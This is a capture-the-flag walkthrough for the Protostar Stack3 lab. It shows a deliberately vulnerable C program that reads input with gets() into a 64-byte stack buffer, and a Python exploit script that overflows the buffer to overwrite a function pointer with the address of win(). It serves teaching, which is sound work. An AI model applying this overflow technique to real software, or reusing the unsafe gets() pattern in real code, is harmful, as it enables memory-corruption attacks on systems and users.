# Stack3
## Briefing
Stack3 looks at environment variables, and how they can be set, and overwriting function pointers stored on the stack (as a prelude to overwriting the saved EIP)

Hint:

both gdb and objdump is your friend you determining where the win() function lies in memory.

This level is at /opt/protostar/bin/stack3
## Source Code
```
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void win()
{
  printf("code flow successfully changed\n");
}

int main(int argc, char **argv)
{
  volatile int (*fp)();
  char buffer[64];

  fp = 0;

  gets(buffer);

  if(fp) {
      printf("calling function pointer, jumping to 0x%08x\n", fp);
      fp();
  }
}
```
## Solution
Stack3 is a slightly easier ret2win.
Easier because we aren't actually overwriting the return address, but a variable that will call a function for us.
This time we should make an actual exploit script, instead of using python from the command line.
```
import struct

exploit = ''
exploit += 'A' * 68

print(exploit)
```
Now every time we want to run this into the program we can use, `python file.py > input`
`./stack3 < input`

`calling function pointer, jumping to 0x41414141`
We have overwritten the ret variable, and that variable has called the function at memory address 0x41414141, unfortunately that is not where are function is.
We can use GDB to find the position of the 'win' function and then jump there with our exploit.

`gdb ./stack3`

`(gdb) p win`

The `p win` command gives us the position of win, which we can see now is at

`$1 = {void (void)} 0x8048424 <win>`

0x8048424

This is where the 'struct' python module comes in!
We edit our script to use this memory address
```
import struct
rp = struct.pack('<L', 0x8048424)

exploit = ''
exploit += 'A' * 64
exploit += rp

print(exploit)
```
The struct.pack changes it into the little endian byte order for us, and then we can run the binary with this script as input.

`code flow successfully changed`

Win!
